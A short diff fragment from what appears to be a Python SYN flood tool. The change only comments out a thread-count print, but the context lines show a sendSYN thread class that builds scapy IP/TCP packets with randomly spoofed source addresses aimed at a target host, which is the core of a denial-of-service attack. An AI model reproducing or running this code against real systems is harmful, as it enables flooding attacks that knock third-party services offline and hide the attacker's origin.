@@ -92,7 +92,7 @@ class sendSYN(threading.Thread):
         try:
             i = sca.IP()
             t = sca.TCP()
-            print ("\r%d threads running" % sendSYN.THREAD, end="")
+            #print ("\r%d threads running" % sendSYN.THREAD, end="")
             i.src = ("%i.%i.%i.%i" % (random.randint(1,254), random.randint(1,254), random.randint(1,254), random.randint(1,254)))
             i.dst = self.__target
             t.sport = random.randint(2048, 65535)
